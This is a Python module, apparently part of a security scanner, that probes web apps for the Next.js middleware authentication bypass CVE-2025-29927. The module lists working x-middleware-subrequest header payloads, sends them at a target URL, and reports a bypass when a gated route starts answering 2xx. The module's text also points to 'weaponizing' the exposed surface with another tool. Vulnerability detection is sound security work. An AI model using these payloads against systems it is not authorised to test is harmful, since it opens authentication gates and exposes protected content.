"""Next.js middleware auth-bypass — CVE-2025-29927, detection only.

Next.js uses an internal ``x-middleware-subrequest`` header to stop middleware from recursing into
its own sub-requests: if an incoming request already carries it (matching the middleware's manifest
path), Next.js **skips the middleware entirely**. Because the header was never stripped from
*external* requests, an attacker sets it themselves and bypasses whatever the middleware enforced —
auth gates, redirects, path allow-lists, injected security headers (CWE-285 / auth bypass).

The manifest value evolved across releases, so we try a small representative set (``middleware`` /
``src/middleware`` / the Next 12 ``pages/_middleware`` / and the ``:``-repeated form that defeats the
Next 13.2–15 ``MAX_RECURSION_DEPTH`` counter). Detection is a pure **differential**: point at a
middleware-gated route (one that redirects to login or answers 401/403 without the header); if adding
the header flips it to ``2xx``, the middleware was skipped. Nothing is exploited — we only observe
whether the gate opens. Weaponizing the reachable surface → Strix.

Affected: Next.js < 12.3.5 / < 13.5.9 / < 14.2.25 / < 15.2.3. Sources: Assetnote & JFrog write-ups
(2025-03), zhero-web-sec; the fix strips the header at the edge.
"""

from __future__ import annotations

HEADER = "x-middleware-subrequest"

# Representative manifest values (not exhaustive) — one per known layout/version window.
BYPASS_PAYLOADS: list[str] = [
    "middleware",
    "src/middleware",
    "pages/_middleware",                              # Next 12 per-page middleware
    "src/pages/_middleware",
    # Next 13.2–15: a MAX_RECURSION_DEPTH counter means the path must repeat to be honoured.
    "middleware:middleware:middleware:middleware:middleware",
    "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
]

# Response-header tells that the app is Next.js (any one is enough).
_NEXT_HEADER_KEYS = ("x-powered-by", "x-nextjs-cache", "x-nextjs-prerender",
                     "x-nextjs-matched-path", "x-middleware-rewrite", "x-middleware-next")
# Redirect targets that mark the gate as an *auth* gate (raises severity vs a locale/slash redirect).
_AUTH_HINTS = ("login", "signin", "sign-in", "auth", "account", "sso", "oauth", "session")


def _lc(headers: dict) -> dict:
    return {k.lower(): (v or "") for k, v in (headers or {}).items()}


def is_nextjs(headers: dict, body: str) -> bool:
    """Best-effort Next.js fingerprint from response headers + body markers (pure)."""

    lc = _lc(headers)
    if "next.js" in lc.get("x-powered-by", "").lower():
        return True
    if any(k in lc for k in _NEXT_HEADER_KEYS if k != "x-powered-by"):
        return True
    b = body or ""
    return "/_next/static" in b or '"__NEXT_DATA__"' in b or "id=\"__NEXT_DATA__\"" in b


def is_gated(status: int | None, headers: dict) -> bool:
    """Does the baseline response look like a middleware *gate* — an auth redirect or a
    401/403 — i.e. something a bypass could open? (pure)"""

    if status in (401, 403):
        return True
    if status in (301, 302, 303, 307, 308):
        return True
    return False


def gate_kind(status: int | None, headers: dict) -> str:
    """Classify the gate so a bypass of an *auth* gate outranks a locale/trailing-slash one (pure)."""

    if status in (401, 403):
        return "auth"
    loc = _lc(headers).get("location", "").lower()
    if any(h in loc for h in _AUTH_HINTS):
        return "auth"
    return "redirect"


def opened(baseline_status: int | None, variant_status: int | None) -> bool:
    """The gate opened: a gated baseline became a 2xx once the header was added (pure)."""

    return is_gated(baseline_status, {}) and variant_status is not None and 200 <= variant_status < 300


async def probe_nextjs_middleware(client, url: str, *, scope_check=None) -> dict:
    """Drive the CVE-2025-29927 differential against *url*: baseline (no header) vs each bypass
    payload; a gated baseline that flips to 2xx confirms the middleware was skipped."""

    async def _get(headers=None):
        return await client.fetch(url, method="GET", headers=headers, follow_redirects=False,
                                  timeout=12.0, scope_check=scope_check)

    base = await _get()
    if base.status is None:
        return {"target": url, "verdict": "unreachable", "findings": [],
                "note": base.error or "request failed"}

    nextjs = is_nextjs(base.headers_map(), base.text(40_000))
    baseline_gated = is_gated(base.status, base.headers_map())

    result: dict = {"target": url, "is_nextjs": nextjs, "baseline_status": base.status,
                    "findings": []}

    if not baseline_gated:
        result["verdict"] = "not_gated"
        result["note"] = (f"baseline returned HTTP {base.status} (not a middleware gate) — point at a "
                          "route that redirects to login or answers 401/403 without the header, else "
                          "there is no gate to bypass")
        return result

    kind = gate_kind(base.status, base.headers_map())
    for payload in BYPASS_PAYLOADS:
        v = await _get({HEADER: payload})
        if opened(base.status, v.status):
            # An auth-gate bypass on a confirmed Next.js app is the real thing; a bare redirect
            # bypass (locale/trailing-slash middleware) or a non-Next app is a weaker `review`.
            confirmed = nextjs and kind == "auth"
            result["findings"].append({
                "payload": payload, "baseline_status": base.status, "bypassed_status": v.status,
                "gate": kind, "severity": "high" if confirmed else "medium",
                "verdict": "confirmed" if confirmed else "review",
                "detail": (f"`{HEADER}: {payload}` turned a gated HTTP {base.status} into "
                           f"{v.status} — Next.js middleware was skipped (CVE-2025-29927). "
                           + ("The gate was an auth redirect/401/403, so this is an auth bypass; "
                              "verify the 2xx body is the real protected content, then weaponize "
                              "the reachable surface via Strix." if confirmed else
                              "The gated response was a plain redirect (possibly locale/trailing-slash "
                              "middleware) or the app isn't confirmed Next.js — verify the 2xx body is "
                              "genuinely protected content before reporting."))})
            break                                     # one working payload is proof; stop probing

    if result["findings"]:
        result["verdict"] = result["findings"][0]["verdict"]
    else:
        result["verdict"] = "not_vulnerable"
        result["note"] = ("the gate held against every x-middleware-subrequest payload — patched "
                          "(≥12.3.5 / 13.5.9 / 14.2.25 / 15.2.3) or not Next.js middleware")
    return result
